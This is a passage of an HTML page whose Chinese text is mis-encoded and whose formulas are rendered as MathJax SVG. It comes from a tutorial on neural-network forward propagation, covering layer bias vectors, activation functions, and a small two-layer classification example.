414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(462,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>b</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup></math></mjx-assistive-mml></mjx-container>ï¼šç¬¬ <mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.674ex" height="1.595ex" role="img" focusable="false" viewbox="0 -694 298 705" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>l</mi></math></mjx-assistive-mml></mjx-container> å±‚çš„åç½®å‘é‡</li><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="2.606ex" height="2.046ex" role="img" focusable="false" viewbox="0 -893.3 1151.9 904.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(498,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>z</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup></math></mjx-assistive-mml></mjx-container>ï¼šæœªæ¿€æ´»çš„çº¿æ€§ç»„åˆç»“æœ</li></ul></li><li><p><strong>æ¿€æ´»å‡½æ•°</strong></p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="11.426ex" height="2.7ex" role="img" focusable="false" viewbox="0 -943.3 5050.3 1193.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(562,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(1493.6,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(2549.4,0)"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(3120.4,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(3509.4,0)"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(498,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(4661.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><msup><mi>a</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup><mo>=</mo><mi>Ïƒ</mi><mo stretchy="false">(</mo><msup><mi>z</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container><p>å…¶ä¸­ <mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.292ex" height="1ex" role="img" focusable="false" viewbox="0 -431 571 442" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>Ïƒ</mi></math></mjx-assistive-mml></mjx-container> æ˜¯æ¿€æ´»å‡½æ•°ï¼ˆå¦‚ ReLUã€Sigmoidã€Tanh ç­‰ï¼‰ï¼Œç”¨äºå¼•å…¥éçº¿æ€§ã€‚</p></li></ol><p>è¿™ä¸ªè¿‡ç¨‹ä»è¾“å…¥å±‚ä¸€ç›´è¿›è¡Œåˆ°è¾“å‡ºå±‚ï¼Œæœ€ç»ˆè¾“å‡ºé¢„æµ‹å€¼ <mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="7.489ex" height="2.485ex" role="img" focusable="false" viewbox="0 -893.3 3310.2 1098.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(300.6,16) translate(-250 0)"><path data-c="5E" d="M112 560L249 694L257 686Q387 562 387 560L361 531Q359 532 303 581L250 627L195 580Q182 569 169 557T148 538L140 532Q138 530 125 546L112 560Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(767.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(1823.6,0)"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(562,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(959,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mrow data-mjx-texclass="ORD"><mover><mi>y</mi><mo stretchy="false">^</mo></mover></mrow><mo>=</mo><msup><mi>a</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>L</mi><mo stretchy="false">]</mo></mrow></msup></math></mjx-assistive-mml></mjx-container>ï¼Œå…¶ä¸­ <mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.541ex" height="1.545ex" role="img" focusable="false" viewbox="0 -683 681 683" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>L</mi></math></mjx-assistive-mml></mjx-container> æ˜¯æœ€åä¸€å±‚ã€‚</p><h4 id="ç®€å•ä¾‹å­">ç®€å•ä¾‹å­</h4><p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªä¸¤å±‚ç¥ç»ç½‘ç»œï¼ˆä¸€ä¸ªéšè—å±‚ï¼‰ï¼Œç”¨äºäºŒåˆ†ç±»ï¼š</p><ul><li>è¾“å…¥ï¼š2ä¸ªç‰¹å¾ <mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="5.57ex" height="1.439ex" role="img" focusable="false" viewbox="0 -442 2461.8 636" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(1008.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="msub" transform="translate(1453.2,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>x</mi><mn>1</mn></msub><mo>,</mo><msub><mi>x</mi><mn>2</mn></msub></math></mjx-assistive-mml></mjx-container></li><li>éšè—å±‚ï¼š3ä¸ªç¥ç»å…ƒï¼Œä½¿ç”¨ ReLU æ¿€æ´»</li><li>è¾“å‡ºå±‚ï¼š1ä¸ªç¥ç»å…ƒï¼Œä½¿ç”¨ Sigmoid æ¿€æ´»</li></ul><p>å‘å‰ä¼ æ’­è¿‡ç¨‹ï¼š</p><ol><li><p>è®¡ç®—éšè—å±‚ï¼š</p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="26.278ex" height="2.7ex" role="img" focusable="false" viewbox="0 -943.3 11614.8 1193.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(498,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(1572.5,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(2628.3,0)"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(1136.2,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 